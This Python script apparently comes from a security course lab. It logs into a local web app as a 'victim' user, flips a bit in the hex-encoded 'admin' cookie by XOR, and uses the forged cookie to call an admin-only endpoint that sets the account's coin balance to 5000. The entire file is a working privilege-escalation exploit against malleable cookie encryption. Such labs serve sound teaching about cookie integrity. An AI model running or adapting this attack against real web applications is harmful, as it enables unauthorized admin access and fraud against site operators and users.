from requests import codes, Session
import requests

import app.api.encr_decr

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
    data_dict = {"username":username,\
      "password":password,\
      "login":"Login"
    }
    response = sess.post(LOGIN_FORM_URL,data_dict)
    return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
    data_dict = {"username":uname,\
    "amount":str(coins),\
    }
    response = sess.post(SETCOINS_FORM_URL, data_dict)
    print("Response code: {}".format(response.status_code))
    return response.status_code == codes.ok

def do_attack():
    sess = Session()
    print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
    uname ="victim"
    pw = "victim"
    assert(do_login_form(sess, uname,pw))
    print("Cookies after logon: {}".format(sess.cookies.get_dict()))
    
    # Maul the admin cookie in the 'sess' object here
    admin_cookie = sess.cookies.get_dict()["admin"]
    print("Admin cookie: {}".format(admin_cookie))
    admin_cookie_bytes = bytearray.fromhex(admin_cookie)
    print("Admin cookie bytes: {}".format(admin_cookie_bytes))
    a = admin_cookie_bytes[0]
    b = 1
    c = a ^ b
    admin_cookie_bytes[0] = c
    print("XOR value: {}".format(c))
    print("Mauled: {}".format(admin_cookie_bytes))
    maul = admin_cookie_bytes.hex()

    # Set new admin cookie with mauled value
    sess.cookies.set("admin", None)
    sess.cookies.set("admin", maul)
    print("Cookies after maul: {}".format(sess.cookies.get_dict()))
    
    # set coins to 5000 coins via the admin's power
    target_uname = uname
    amount = 5000
    result = do_setcoins_form(sess, target_uname, amount)
    print("Attack successful? " + str(result))

if __name__=='__main__':
    do_attack()
